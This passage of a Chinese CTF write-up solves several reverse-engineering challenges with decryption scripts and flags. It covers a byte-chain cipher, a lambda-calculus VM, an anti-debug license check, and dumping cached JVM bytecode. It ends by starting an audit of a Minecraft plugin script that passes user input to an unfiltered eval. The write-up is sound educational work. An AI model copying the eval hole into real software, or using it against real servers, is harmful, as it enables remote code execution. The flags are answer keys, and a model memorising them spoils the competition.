| **`prev + (KEY ^ data)`** | `0x42 + (0x73 ^ 0x49) = 0x42 + 0x3a = 0x7c` | **`0x7c`** | **✓**         |

**`KEY ^ data` 命中。**

第二位交叉验证：

`j = 1`，`PERM[1] = 6`，`data[6] = TARGET[6] = 0x28`，`KEY[1] = 0x34`：

```
prev = 0x7c
0x7c + (0x34 ^ 0x28) = 0x7c + 0x1c = 0x98
```

**实测 `transform(TARGET)[1] = 0x53`，不匹配！**

`0x98 ≠ 0x53`。所以 `j=1` 的模型也错了——`PERM[1]` 可能不是 6。

回看 `transform(TARGET)` 完整输出：

```
7c 53 a1 a8 7d 81 9c f4 c7 11 ff d3 bc 66 15 b1 68 38 9c 44 d0 63 8a c0
```

逐位反推 `data[PERM[j]]`：

```
j=0: delta = 0x7c - 0x42 = 0x3a;  KEY[0]=0x73;  data[PERM[0]] = 0x73 ^ 0x3a = 0x49  ✓ TARGET[0]
j=1: delta = 0x53 - 0x7c = 0xd7;  KEY[1]=0x34;  data[PERM[1]] = 0x34 ^ 0xd7 = 0xe3  ✓ TARGET[1]
j=2: delta = 0xa1 - 0x53 = 0x4e;  KEY[2]=0x66;  data[PERM[2]] = 0x66 ^ 0x4e = 0x28  ✓ TARGET[2]
...
```

**说明 `PERM[j] = j`**（顺序映射），不是 `[0,6,12,18,...]`！

那 `s(i)` 和 `PERM` 从哪来的？

`only[i]=1` 的差分模式（阶梯式影响）不是来自 `PERM`，而是来自**累加链本身**：

```
prev = IV
for j in 0..23:
    prev = (prev + (KEY[j%8] ^ data[j])) & 0xFF   ← 注意是 data[j] 不是 data[PERM[j]]
    out[j] = prev
```

- 改 `data[0]`：影响 `out[0], out[1], ..., out[23]` 全部 → **全 -1** ✓
- 改 `data[1]`：`out[0]` 不受影响（`j=0` 时用 `data[0]`），`out[1..23]` 受影响 → **从第 1 位起** ✓
- 改 `data[2]`：**从第 2 位起** ✓

**但实测 `only[1]=1` 是"从第 4 位起"、`only[2]=1` 是"从第 8 位起"**——这不是 `j` 的阶梯，而是**每 4 字节取一次 `data[i//4]`**！

所以真实结构是：

```
for j in 0..23:
    i = j // 4          ← 每 4 个输出位置用同一个输入字节
    prev = (prev + (KEY[j%8] ^ data[i])) & 0xFF
    out[j] = prev
```

验证 `only[1]=1`（`data[1]=1`，影响 `i=1`，即 `j ∈ {4,5,6,7}` 起）：

- `j=0,1,2,3` 时 `i=0`，`data[0]=0`，无影响 → 前 4 字节不变 ✓
- `j=4..23` 时 `i ∈ {1,2,3,4,5}`，`data[1]=1` 影响 `i=1` 的 `j ∈ {4,5,6,7}`，但**之后 `i=2` 时 `data[1]` 不再参与**——**理论上 `only[1]=1` 应该只影响 `j ∈ {4,5,6,7}`，即 4 个字节**

但实测 `only[1]=1` 影响 `j ∈ [4, 23]` 共 20 个字节。**累加链让影响向后传播**：`out[4]` 变了，`out[5]` 依赖 `out[4]`，`out[6]` 依赖 `out[5]`……所以 `data[1]=1` 的扰动通过 `prev` 一路传到 `out[23]`。

**这解释了阶梯模式**：

- `data[i]` 在 `j = 4i` 处首次参与
- 之后通过 `prev` 链向后传播到 `j = 23`
- 所以 `data[i]=1` 影响 `j ∈ [4i, 23]`

**这就是 `S(i) = 4i`**，而不是 `4*(i%6) + i//6`。

再验证 `only[6]=1`（`data[6]=1`，首次参与 `j = 4*6 = 24`，**超出范围**）：

- 但实测 `only[6]=1` 影响 `j ∈ [1, 23]`，且是 `+1`！

**矛盾**——`i=6` 的 `4i=24` 超出 24，不应该被用到。说明 `i = j // 4` 不对。

回看 `only[i]=1` 的完整影响范围（`S(i)` = 首次影响位置）：

| `i`  | `S(i)` | `s(i)` 符号 |
| :--- | :----- | :---------- |
| 0    | 0      | -1          |
| 1    | 4      | -1          |
| 2    | 8      | -1          |
| 3    | 12     | -1          |
| 4    | 16     | -1          |
| 5    | 20     | -1          |
| 6    | **1**  | **+1**      |
| 7    | **5**  | -1          |
| 8    | **9**  | **+1**      |
| 9    | **13** | -1          |
| 10   | **17** | **+1**      |
| 11   | **21** | -1          |
| 12   | **2**  | **+1**      |
| 13   | **6**  | -1          |
| 14   | **10** | **+1**      |
| 15   | **14** | -1          |
| 16   | **18** | **+1**      |
| 17   | **22** | -1          |
| 18   | **3**  | -1          |
| 19   | **7**  | -1          |
| 20   | **11** | -1          |
| 21   | **15** | -1          |
| 22   | **19** | -1          |
| 23   | **23** | -1          |

**规律非常清晰**：

- `S(i) = 4*(i % 6) + (i // 6)`
- `s(i) = +1` 当 `i ∈ {6, 8, 10, 12, 14, 16}`，否则 `-1`

这是**两个不同维度的混合**：

- `i % 6` 决定"哪一组"（每组 4 个连续位置）
- `i // 6` 决定"组内偏移"（0..3，因为 24/6=4）

**为什么是 6 和 4？** 因为 24 = 6×4。`data` 被拆成 6 组、每组 4 个元素，但**读写顺序不同**：

- 读：`data[i]` 按 `i = 0..23` 顺序
- 写：`out[j]` 按 `S(i)` 的位置

这是个**转置**操作：`data` 按 `6×4` 矩阵行优先读，`out` 按 `4×6` 矩阵行优先写（等价于按 `6×4` 矩阵列优先写）。

5.1 用新结构重新验证

```
prev = IV
for j in 0..23:
    i = PERM[j]                  ← PERM[j] = 满足 S(i)=j 的 i
    prev = (prev + (KEY[j%8] ^ data[i])) & 0xFF
    out[j] = prev
```

其中 `PERM = [0, 6, 12, 18, 1, 7, 13, 19, 2, 8, 14, 20, 3, 9, 15, 21, 4, 10, 16, 22, 5, 11, 17, 23]`。

**这次 `PERM` 和 `S(i)` 是互逆的**：

- `S(0) = 0` → `PERM[0] = 0` ✓
- `S(6) = 1` → `PERM[1] = 6` ✓
- `S(12) = 2` → `PERM[2] = 12` ✓
- …

关于 `s(i)` 符号：

`only[i]=1` 的 `±1` 符号是 `KEY[j%8] ^ 1 - KEY[j%8]` 的结果：

- `j = S(i)` 是 `data[i]` 首次参与的位置
- 首次参与时，`delta = KEY[S(i) % 8] ^ 1 - KEY[S(i) % 8]`
- 如果 `KEY[S(i) % 8]` 最低位是 1 → `delta = -1` → 差分 `ff`
- 如果最低位是 0 → `delta = +1` → 差分 `01`

验证 `i=6`：`S(6) = 1`，`KEY[1] = 0x34`（最低位 0）→ `delta = +1` ✓
验证 `i=8`：`S(8) = 9`，`KEY[9%8] = KEY[1] = 0x34`（最低位 0）→ `delta = +1` ✓
验证 `i=12`：`S(12) = 2`，`KEY[2] = 0x66`（最低位 0）→ `delta = +1` ✓
验证 `i=0`：`S(0) = 0`，`KEY[0] = 0x73`（最低位 1）→ `delta = -1` ✓

**`s(i)` 完全不需要单独建模——它是 `KEY` 最低位 + `S(i) % 8` 的自动结果。**

```
// 已知 KEY[0] = 0x73, TARGET[0] = 0x49
// 已知 transform(TARGET)[0] = 0x7c
// 已知 IV = 0x42

// 手算验证 3 种候选：
//   + : 0x42 + (0x73 + 0x49) = 0xfe   ✗
//   ^ : 0x42 + (0x73 ^ 0x49) = 0x7c   ✓
//   - : 0x42 + (0x73 - 0x49) = 0x6c   ✗

// 在 Frida 里验证第二个字节：
//   transform(TARGET)[1] = 0x53
//   0x7c + (0x34 ^ 0xe3) = 0x7c + 0xd7 = 0x53   ✓
```

解密脚本如下：

```py
import sys

KEY = b"s4feKey!"
IV  = 0x42

PERM = [0, 6, 12, 18, 1, 7, 13, 19, 2, 8, 14, 20,
        3, 9, 15, 21, 4, 10, 16, 22, 5, 11, 17, 23]

TARGET_HEX = "499ea0a2c4c7e3617ecfe4f6286288d6025e6279b1bdcd17"
TARGET = bytes.fromhex(TARGET_HEX)


# def warehouse_transform(data: bytes) -> bytes:
#     if len(data) < 24:
#         raise ValueError(f"input too short: {len(data)} < 24")
#     out = bytearray(24)
#     prev = IV
#     for j in range(24):
#         prev = (prev + (KEY[j % 8] ^ data[PERM[j]])) & 0xFF
#         out[j] = prev
#     return bytes(out)


def warehouse_inverse(target: bytes) -> bytes:
    data = [0] * 24
    prev = IV
    for j in range(24):
        delta = (target[j] - prev) & 0xFF
        data[PERM[j]] = KEY[j % 8] ^ delta
        prev = target[j]
    return bytes(data)


def main():
    print(f"KEY      = {KEY!r}")
    print(f"IV       = 0x{IV:02x}")
    print(f"TARGET   = {TARGET.hex()}")

    flag = warehouse_inverse(TARGET)
    print("FLAG     = flag{" + flag.decode() + "}")


if __name__ == "__main__":
    sys.exit(main())

```

输出如下：

```txt
> python decrypt.py
KEY      = b's4feKey!'
IV       = 0x42
TARGET   = 499ea0a2c4c7e3617ecfe4f6286288d6025e6279b1bdcd17
FLAG     = flag{tiny_safe_hides_big_work}
```

我们来验证一下：

```txt
> challenge
Confidential cargo handoff: flag{tiny_safe_hides_big_work}
Handoff complete. Ten-second exit plan finally resumed.
```

```txt
flag{tiny_safe_hides_big_work}
```

## Week 5

## Reverse

### 匿名M

main 函数如下：

![](https://img.halfcity.top/2026/11/10/4d51cff1ce2e7fa8ed85ff99cd68a3b0.png)

这里似乎和之前的函数不太一样，仔细一看似乎原本很多被拆分成多个函数的地方在这被 inline 了。

简单重命名一下，可以看到函数前面的内容还是和之前一样获取输入并检测内容是否合理：

![](https://img.halfcity.top/2026/11/10/9d055b43820800048a5876725e83818d.png)

随后就看到了一堆很抽象的东西，里面有大量的递归调用，一问才知道是 AST。

![](https://img.halfcity.top/2026/11/10/5ba648e67d8d77df7935549dd81d4b97.png)

分析如下：

```c
if ( is_procable ) {
    for ( i = 0; i < nx17; ++i )                    // nx17 = 0x17 = 23
        if ( s1[i + 5] <= 0x1Fu || s1[i + 5] > 0x7Eu )
            is_procable = 0;                        // 23 个有效字符必须可打印
}

if ( is_procable ) {
    argva = 0;
    v26 = &unk_402028;                              // 59B 程序字节码起点
    nx3B_1 = nx3B;                                  // 0x3B = 59
    nx3B_2 = 0;
    v23 = parse(&v26, 0, &argva);                   // 字节码 → AST
    if ( nx3B_2 != nx3B_1 ) fail();                 // 必须正好解析 59 字节

    v24 = evaluate(v23, 0, &argva);                 // AST → 闭包（λ 项函数）

    v13 = 0;
    for ( j = 0; j < nx17; ++j ) {                  // 遍历 23 个用户字符
        argv_ = 0;
        v8  = church(s1[j + 5], &argv_);            // 用户字符 → Church 数
        v25 = apply(v24, v8, &argv_);               // 把 v24 应用到 Church 数
        v18 = unchurch(v25, &argv_);                // 结果 Church 数 → 整数
        v13 |= v18 != u16(2*j + nx3B + 4202536);    // 与 .rodata 中密文比较
        release(&argv_);
    }
    release(&argva);

    Wrong = v13 ? "Wrong" : "Correct";
    puts(Wrong);
    return v13 != 0;
}
```



#### `parse`：字节码 → 语法树

![](https://img.halfcity.top/2026/11/10/5dd548071c2326fbc417d3766fc845d3.png)

```
tag 0x00 idx  → 变量（de Bruijn 索引 idx）
tag 0x01      → lambda，递归解析一个 body
tag 0x02      → application，递归解析两个子项
```

对应的内部节点是：

```c
node(type, a, b, c, d)   // 具体字段名按题意
// 0 → 变量，第二个参数存 idx
// 1 → λ，第三个参数存 body
// 2 → app，第三、四个参数存左、右子项
```

#### `evaluate`：在环境 `env` 下求值

![](https://img.halfcity.top/2026/11/10/fe34ad809bf63ebb40e8e8f05297b565.png)

大致逻辑如下：

```c
evaluate(a1, a2, argv):
    switch (ast->type):
        case 0 (Var):   沿 env 走 idx 步取绑定值         // 变量 → 值
        case 1 (Lam):   返回闭包 {body, env}             // λ   → 闭包（不再执行 body）
        case 2 (App):   f = evaluate(left,  env)
                        x = evaluate(right, env)
                        return apply(f, x)               // 交棒给 apply 完成调用
```

- `tag 0`：沿环境链表走 `idx` 步取绑定值
- `tag 1`：构造闭包 `{type=0, body=child, env=当前env}`
- `tag 2`：分别求值左右子项，再 `apply(f, x)`

#### `apply`：函数应用

![](https://img.halfcity.top/2026/11/10/1c30eeedc93b3b5bc6fcea8b854ad4c8.png)

- 如果 `f` 是闭包：把 `x` 压入环境，继续 `evaluate(body, new_env)`
- 否则：要求 `f` 是 `tag=1` 的"后继"节点、`x` 是 `tag=2` 的数字节点，返回 `x.num + 1`

这里是最后应用 evaluate 返回的闭包函数的地方。 

#### `.rodata` 数据布局

```
word_402024 = 0x17 = 23      → 后面密文的数量
word_402026 = 0x3B = 59      → 前面程序字节码的长度
unk_402028[0 : 59]           → 程序字节码
unk_402028[59 : 59+46]       → 23 个小端 u16 密文
```

把 59 字节程序解析出来（脚本 `parser` 部分会打印），可以看到：

- 出现过 `λp λq. p(p(p q))` → **Church 数 3**
- 出现过 `λt λz. t(t(t z))` → **Church 数 3**

即程序本身就是一段用 λ 演算写的"Church 3 生成器"，是一种**提示**——真正要用的 key 就是 3。

观察 23 个密文 word：

```
8B E1 C1 ED C1 DB 63 EF CD C1 DB C5 DD C7 CB C5 CB C5 CB C5 81 81 81
```

**全部是奇数**。这强烈暗示加密是仿射变换：

```
c = a·p + b,  a 与 b 奇偶性相反才能保证 c 奇数 → 常见取值 a=2, b=奇数
```

- 如果 `a=2, b=3`，则 `p = (c - 3)/2`，把明文限制在可打印 ASCII（32~126），只有 `b=3` 能满足全部 23 个字符都在可打印范围内。
- 同时程序里出现了两次 Church 3（`λpλq.p(p(p q))` 和 `λtλz.t(t(t z))`），互相印证 `key = 3`。

所以解密式就是：

```
p = (c - 3) // 2
```

解密脚本如下：

```py
data = bytes([
    0x02, 0x01, 0x02, 0x01, 0x02, 0x01, 0x01, 0x02,
    0x02, 0x00, 0x02, 0x02, 0x00, 0x03, 0x00, 0x00,
    0x00, 0x01, 0x01, 0x01, 0x02, 0x00, 0x01, 0x02,
    0x00, 0x01, 0x02, 0x00, 0x01, 0x00, 0x00, 0x01,
    0x01, 0x02, 0x00, 0x01, 0x02, 0x00, 0x01, 0x00,
    0x00, 0x01, 0x01, 0x01, 0x01, 0x02, 0x02, 0x00,
    0x03, 0x00, 0x01, 0x02, 0x02, 0x00, 0x02, 0x00,
    0x01, 0x00, 0x00,

    0x8B, 0x00, 0xE1, 0x00, 0xC1, 0x00, 0xED, 0x00,
    0xC1, 0x00, 0xDB, 0x00, 0x63, 0x00, 0xEF, 0x00,
    0xCD, 0x00, 0xC1, 0x00, 0xDB, 0x00, 0xC5, 0x00,
    0xDD, 0x00, 0xC7, 0x00, 0xCB, 0x00, 0xC5, 0x00,
    0xCB, 0x00, 0xC5, 0x00, 0xCB, 0x00, 0xC5, 0x00,
    0x81, 0x00, 0x81, 0x00, 0x81, 0x00,
])

CODE_LEN = 0x3B
CIPHER_N = 0x17

pos = 0
def parse(depth=0):
    global pos
    t = data[pos]; pos += 1
    if t == 0x00:                                  # 变量
        idx = data[pos]; pos += 1
        assert idx < depth, f"bad var idx={idx}, depth={depth}"
        return ('var', idx)
    elif t == 0x01:                                # λ
        body = parse(depth + 1)
        return ('lam', body)
    elif t == 0x02:                                # app
        f = parse(depth)
        a = parse(depth)
        return ('app', f, a)
    else:
        raise ValueError(f"bad opcode {t} at {pos-1}")

prog = parse()
assert pos == CODE_LEN, f"parse ended at {pos}, expected {CODE_LEN}"
print("[*] length =", pos)

def show(n, ind=0):
    pad = '  ' * ind
    if n[0] == 'var':
        return f"{pad}var#{n[1]}"
    if n[0] == 'lam':
        return f"{pad}λ.(\n{show(n[1], ind+1)}\n{pad})"
    if n[0] == 'app':
        return f"{pad}app(\n{show(n[1], ind+1)}\n{show(n[2], ind+1)}\n{pad})"

print("\n[*] AST:")
print(show(prog))

cipher = []
for i in range(CIPHER_N):
    lo = data[CODE_LEN + i*2]
    hi = data[CODE_LEN + i*2 + 1]
    cipher.append(lo | (hi << 8))
print("\n[*] cipher =", [hex(c) for c in cipher])

# 爆破 key（1~255 的奇数），要求所有明文都是可打印 ASCII
print("\n[*] 爆破 key:")
solutions = []
for k in range(1, 256, 2):
    s = []
    ok = True
    for c in cipher:
        d = c - k
        if d % 2 != 0:          # 保证可整除
            ok = False; break
        p = d // 2
        if not (32 <= p < 127): # 可打印 ASCII
            ok = False; break
        s.append(chr(p))
    if ok:
        text = ''.join(s)
        solutions.append((k, text))
        print(f"    key = {k:3d} (0x{k:02x}) → {text}")


text = next((k, t) for k, t in solutions if k == 3)[1]

print("FLAG = flag{" + text + "}")

```

输出如下：

```
> python solve.py
[*] length = 59

[*] AST:
app(
  λ.(
    app(
      λ.(
        app(
          λ.(
            λ.(
              app(
                app(
                  var#2
                  app(
                    var#3
                    var#0
                  )
                )
                var#1
              )
            )
          )
          λ.(
            λ.(
              app(
                var#1
                app(
                  var#1
                  app(
                    var#1
                    var#0
                  )
                )
              )
            )
          )
        )
      )
      λ.(
        λ.(
          app(
            var#1
            app(
              var#1
              var#0
            )
          )
        )
      )
    )
  )
  λ.(
    λ.(
      λ.(
        λ.(
          app(
            app(
              var#3
              var#1
            )
            app(
              app(
                var#2
                var#1
              )
              var#0
            )
          )
        )
      )
    )
  )
)

[*] cipher = ['0x8b', '0xe1', '0xc1', '0xed', '0xc1', '0xdb', '0x63', '0xef', '0xcd', '0xc1', '0xdb', '0xc5', '0xdd', '0xc7', '0xcb', '0xc5', '0xcb', '0xc5', '0xcb', '0xc5', '0x81', '0x81', '0x81']

[*] 爆破 key:
    key =   1 (0x01) → Ep`v`m1wf`mbncebebeb@@@
    key =   3 (0x03) → Do_u_l0ve_lambdadada???
    key =   5 (0x05) → Cn^t^k/ud^k`lac`c`c`>>>
    key =   7 (0x07) → Bm]s]j.tc]j_k`b_b_b_===
    key =   9 (0x09) → Al\r\i-sb\i^j_a^a^a^<<<
    key =  11 (0x0b) → @k[q[h,ra[h]i^`]`]`];;;
    key =  13 (0x0d) → ?jZpZg+q`Zg\h]_\_\_\:::
    key =  15 (0x0f) → >iYoYf*p_Yf[g\^[^[^[999
    key =  17 (0x11) → =hXnXe)o^XeZf[]Z]Z]Z888
    key =  19 (0x13) → <gWmWd(n]WdYeZ\Y\Y\Y777
    key =  21 (0x15) → ;fVlVc'm\VcXdY[X[X[X666
    key =  23 (0x17) → :eUkUb&l[UbWcXZWZWZW555
    key =  25 (0x19) → 9dTjTa%kZTaVbWYVYVYV444
    key =  27 (0x1b) → 8cSiS`$jYS`UaVXUXUXU333
    key =  29 (0x1d) → 7bRhR_#iXR_T`UWTWTWT222
    key =  31 (0x1f) → 6aQgQ^"hWQ^S_TVSVSVS111
    key =  33 (0x21) → 5`PfP]!gVP]R^SURURUR000
    key =  35 (0x23) → 4_OeO\ fUO\Q]RTQTQTQ///
FLAG = flag{Do_u_l0ve_lambdadada???}
```

```txt
flag{Do_u_l0ve_lambdadada???}
```

### license

![](https://img.halfcity.top/2026/11/10/b832fea4600b3f8be1ddb740339c22af.png)

观察程序的逻辑，这似乎是一个破解的动态题。

先简单答题恢复一下程序的逻辑，随后我们分开讲解：

![](https://img.halfcity.top/2026/11/10/377cf4adb74d1789c392866be10a41f2.png)

这里我们往后看看可以看到 `s_license` 似乎是会参与后续的解密逻辑的，这样我们就不应该一路 patch 下去了，我们需要正经分析一下。

`sub_401CE6` 是 input 函数，获取输入，其中 `sub_4013CB` 会对 Account 校验：

```c
__int64 __fastcall sub_4013CB(const char *s1)
{
  unsigned __int64 i; // [rsp+18h] [rbp-8h]

  if ( strlen(s: s1) != 12 )
    return 0;
  for ( i = 0; i <= 0xB; ++i )
  {
    if ( (unsigned __int8)sub_401396((unsigned __int8)((7 * i + 90) ^ s1[i]), 3) != *(_BYTE *)(i + 4206913) )
      return 0;
  }
  return 1;
}
```

一个8位循环左移加密，其中 `*(_BYTE *)(i + 4206913)` 这里似乎利用局部变量来对全局变量进行了访问。

解密脚本如下：

```py
byte_403141 = [
    0x70, 0x70, 0x88, 0x70, 0xD8, 0xE0,
    0x7E, 0x57, 0x0F, 0x67, 0x6E, 0x76,
]

def ror8(v, n):
    v &= 0xFF
    return ((v >> n) | (v << (8 - n))) & 0xFF

account = ''.join(
    chr(ror8(byte_403141[i], 3) ^ ((7 * i + 90) & 0xFF))
    for i in range(12)
)
print("account =", account)
```

输出如下：

```txt
> python tell_me_ur_name.py
account = ToyamaKasumi
```

随后 Account 被传入 `sub_40145D` 生成 key：

![](https://img.halfcity.top/2026/11/10/4a1c0bdb9bde8968fdcf3c2324bb95bd.png)

这里的加密并不难，但是我们有更简单的方式就是直接看返回值所以就不必写 keygen 了：

![](https://img.halfcity.top/2026/11/10/e7f4f0f859246327e5fcdbbd0ea9ecba.png)

![](https://img.halfcity.top/2026/11/10/75a3634c059408fd3bdf02bc63cef4e2.png)

![](https://img.halfcity.top/2026/11/10/b9adeea38e4dd3cf40a281bffbf2bce7.png)

```txt
C325-67C4-C8BA-CD0E
```

```txt
❯ ./license
Four Layers / Rookie License Desk
Account: ToyamaKasumi
License: C325-67C4-C8BA-CD0E
flag{static_analysis_is_all_you_need}
```

这里似乎解出了一个假的 flag。

![](https://img.halfcity.top/2026/11/10/129423c2e07c70c871e23e14fb0e17ea.png)

![](https://img.halfcity.top/2026/11/10/441c64339c7c43380007c5dcbb934757.png)

注意这里 ptrace 的检测结果似乎对于选择的密文发生影响。

我们可以测试一下如果处于 debug 状态输出会怎么样：

![](https://img.halfcity.top/2026/11/10/1068cd24a71e30414ddb45df8989c49e.png)

可以看到这里出题人搞了个小巧思：

```txt
flag{lic3Nse_can_be_Reee!}
```

### 幽灵法则

#### 静态类

题目给了一个 jar 包和 jvm，我们先简单看看 jar包：

![](https://img.halfcity.top/2026/11/10/2c89bd6cdfedb602309b59d4531aeeeb.png)

![](https://img.halfcity.top/2026/11/10/1bb2296f797cf88cf9363e313e4e6a8e.png)

```java
package defpackage;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;

/* JADX INFO: loaded from: ghost-rule.jar:Main.class */
public final class Main {
    public static void main(String[] strArr) throws Exception {
        if (strArr.length == 1 && strArr[0].equals("--train")) {
            Class.forName("Verifier");
            return;
        }
        System.out.println("ghost rule / 幽灵法则");
        System.out.print("flag> ");
        System.out.flush();
        String line = new BufferedReader(new InputStreamReader(System.in, StandardCharsets.UTF_8)).readLine();
        System.out.println(line != null && line.startsWith("flag{") && line.endsWith("}") && line.length() == 38 && Verifier.verifyStuff(line.substring(5, 37).getBytes(StandardCharsets.UTF_8)) ? "Accepted." : "Rejected.");
    }
}
```

校验逻辑异常简单，没有任何的弯子。

这里对 32 字节输入逐字节做一个可逆的链式变换，然后与 `iArr` 的低 8 位比较。因为变换可逆，所以可以直接反推出每个位置的原始字节。

1. 输入必须是 32 字节，对应 `flag{...}` 中间部分。

2. `i` 是固定初始值 `9320` 的 xorshift 伪随机序列，每轮先更新。

3. 每轮取输入字节的下标为：

   ```java
   ((i3 * 11) + 9) & 31
   ```

   这是一个 0~31 的排列。

4. 每轮实际比较的是：

   ```java
   i8 = rotl8(i6, i7) ^ i2
   ```

   其中：

   ```java
   i6 = ((((b[idx] & 255) ^ (i & 255)) * 173) + 47) & 255
   i7 = ((i >>> 8) & 7) + 1
   ```

5. `173` 在模 256 下的逆元是 `37`，因为：

   ```text
   173 * 37 ≡ 1 mod 256
   ```

   所以可从 `i6` 反推：

   ```java
   x = ((i6 - 47) * 37) & 255
   b[idx] = x ^ (i & 255)
   ```

6. `i2` 初始为 `211`，之后每轮更新为上一轮的比较值 `iArr[i3] & 255`。

解密脚本如下：

```py
iArr = [
    27603, 27615, 27533, 27574, 27444, 27434, 27596, 27500,
    27557, 27519, 27547, 27420, 27473, 27395, 27595, 27475,
    27641, 27459, 27595, 27647, 27562, 27392, 27533, 27412,
    27604, 27431, 27465, 27413, 27626, 27410, 27421, 27535
]

MASK = 0xffffffff

def rotl8(v, r):
    v &= 0xff
    return ((v << r) | (v >> (8 - r))) & 0xff

def rotr8(v, r):
    v &= 0xff
    return ((v >> r) | (v << (8 - r))) & 0xff

i = 9320
prev = 211
b = bytearray(32)

for t in range(32):
    # Java int 的 32 位 xorshift
    i4 = (i ^ (i << 11)) & MASK
    i5 = (i4 ^ (i4 >> 19)) & MASK
    i = (i5 ^ (i5 << 9)) & MASK

    idx = ((t * 11) + 9) & 31
    r = ((i >> 8) & 7) + 1

    target = iArr[t] & 0xff

    # target = rotl8(i6, r) ^ prev
    rot = target ^ prev
    i6 = rotr8(rot, r)

    # i6 = ((((b[idx] ^ (i & 255)) * 173) + 47) & 255)
    x = (((i6 - 47) * 37) & 0xff)
    b[idx] = x ^ (i & 0xff)

    prev = target

content = bytes(b).decode()
print("flag{" + content + "}")
```

输出如下：

```txt
> python trust_light.py
flag{jar_says_yes_but_cache_says_no!!}
```

观察这个 flag 就能看出来这个 flag 很明显是假的，也理应如此，这里给了我们一个提示，jar 包是对的但是 cache 是错的。

所以实际在 cache 中运行的 jar 包和我们手上静态的 jar 包应该是不一致的。

我们需要做的是从内存中 dump 出真实的 jar 包然后对他进行分析。

#### 缓存类

先将程序跑起来：

![](https://img.halfcity.top/2026/11/10/525e92a64d9102e8295fcd6f95380da2.png)

然后我们使用 jhsdb 连接到这个程序。

注意这里的大版本最好要匹配并且要先关闭版本检查：

```txt
❯ export JAVA_TOOL_OPTIONS="-Dsun.jvm.hotspot.runtime.VM.disableVersionCheck"
```

![](https://img.halfcity.top/2026/11/10/9d365e36bfb45a1979411d731c3a26ed.png)

![](https://img.halfcity.top/2026/11/10/10160c5b3f01f437fcbeaabf0b3efa72.png)

![](https://img.halfcity.top/2026/11/10/6eb787b259dcf9f4ae7aabd6fa86ba35.png)

随后可以拉到主机分析了：

![](https://img.halfcity.top/2026/11/10/0864e3aa61203a32ec3d3aef5cb19544.png)

```java
package defpackage;

/* JADX INFO: loaded from: Verifier.class */
public final class Verifier {
    public static boolean verifyStuff(byte[] bArr) {
        if (bArr.length != 32) {
            return false;
        }
        int[] iArr = {27571, 27643, 27422, 27471, 27609, 27608, 27547, 27566, 27480, 27407, 27464, 27499, 27546, 27480, 27558, 27623, 27527, 27636, 27420, 27531, 27620, 27423, 27520, 27631, 27640, 27543, 27502, 27584, 27537, 27416, 27479, 27565};
        int i = 4919;
        int i2 = 167;
        for (int i3 = 0; i3 < 32; i3++) {
            int i4 = i ^ (i << 13);
            int i5 = i4 ^ (i4 >>> 17);
            i = i5 ^ (i5 << 7);
            int i6 = ((((bArr[((i3 * 13) + 7) & 31] & 255) ^ (i & 255)) * 197) + 101) & 255;
            int i7 = ((i >>> 8) & 7) + 1;
            int i8 = (((i6 << i7) | (i6 >>> (8 - i7))) & 255) ^ i2;
            if (i8 != (iArr[i3] & 255)) {
                return false;
            }
            i2 = i8;
        }
        return true;
    }
}
```

这里几乎将之前的参数全部换了一遍：

- `iArr` 换成了新数组
- `i` 初始值从 `9320` 变为 `4919`
- `i2` 初始值从 `211` 变为 `167`
- xorshift 参数变为 `13 / 17 / 7`
- 仿射变换乘数从 `173` 变为 `197`，加数从 `47` 变为 `101`
- 索引变换从 `(i3*11+9)&31` 变为 `(i3*13+7)&31`

修改后的解密脚本如下：

```py
iArr = [
    27571, 27643, 27422, 27471, 27609, 27608, 27547, 27566,
    27480, 27407, 27464, 27499, 27546, 27480, 27558, 27623,
    27527, 27636, 27420, 27531, 27620, 27423, 27520, 27631,
    27640, 27543, 27502, 27584, 27537, 27416, 27479, 27565
]

MASK = 0xffffffff

def rotl8(v, r):
    v &= 0xff
    return ((v << r) | (v >> (8 - r))) & 0xff

def rotr8(v, r):
    v &= 0xff
    return ((v >> r) | (v << (8 - r))) & 0xff

i = 4919
prev = 167
b = bytearray(32)

for t in range(32):
    # Java int 32 位 xorshift: i ^= i << 13; i ^= i >>> 17; i ^= i << 7
    i4 = (i ^ (i << 13)) & MASK
    i5 = (i4 ^ ((i4 & MASK) >> 17)) & MASK
    i = (i5 ^ (i5 << 7)) & MASK

    idx = ((t * 13) + 7) & 31
    r = ((i >> 8) & 7) + 1

    target = iArr[t] & 0xff

    # target = rotl8(i6, r) ^ prev
    rot = target ^ prev
    i6 = rotr8(rot, r)

    # i6 = ((((b[idx] ^ (i & 255)) * 197) + 101) & 255)
    # 197 的逆元是 13
    x = (((i6 - 101) & 0xff) * 13) & 0xff
    b[idx] = x ^ (i & 0xff)

    prev = target

content = bytes(b).decode()
print("flag{" + content + "}")
```

输出如下：

```txt
> python true_way.py
flag{cache_keeps_the_real_bytecode!!!}
```

```txt
flag{cache_keeps_the_real_bytecode!!!}
```

## MC

写作 MC 读作审计

题目的名字叫 `TrChat`，说的可能就是这个 MC 插件了

![](https://img.halfcity.top/2026/11/10/a2691745b2cec8158fc923b0a81f759d.png)

我们检查一下其他的插件有没有问题：

![](https://img.halfcity.top/2026/11/10/ab5ae85d86c03df1ae8dbbd03dd5d6a4.png)

![](https://img.halfcity.top/2026/11/10/6d41fc6d91cf831f0f99a437c5e34b8d.png)

这里确认了这个 `PlaceholderAPI` 的插件的 js 扩展可能导致我们执行任意的 nodejs 环境下的 js 代码。

我们看看它的定义文件。

### 审计

`javascript_placeholders.yaml`:

```yaml
# Javascript Expansion: @VERSION@
# This is the main configuration file for the Javascript Expansion.
# 
# You will define your javascript placeholders in this file.
# 
# Javascript files must be located in the:
#  /plugins/placeholderapi/javascripts/ folder
# 
# A detailed guide on how to create your own javascript placeholders
# can be found here:
# https://github.com/PlaceholderAPI-Expansions/Javascript-Expansion/wiki
# 
# Your javascript placeholders will be identified by: %javascript_<identifier>%
# 
# Configuration format:
# 
# <identifier>:
#   file: <name of file>.<file extension>
# 
# Example:
# 
# 'my_placeholder':
#   file: 'my_placeholder.js'
calc:
  file: calc.js
example:
  file: example.js

```

`calc.js` ：

```js
// 配置里写算式用的占位符，变量从 Player 绑定取
lvl = Player.getLevel();
hp = Player.getHealth();
ping = Player.getPing();
eval(args[0]);

```

这里的 calc 做了一个非常危险的操作，它没有任何过滤直接将 arg 传入了 eval 函数。

- `eval(args[0])`。
  - `args[0]` 是占位符传入的第一个参数。
  - `eval` 会把这段字符串当 **完整 JavaScript 代码执行**，不是当算式解析。
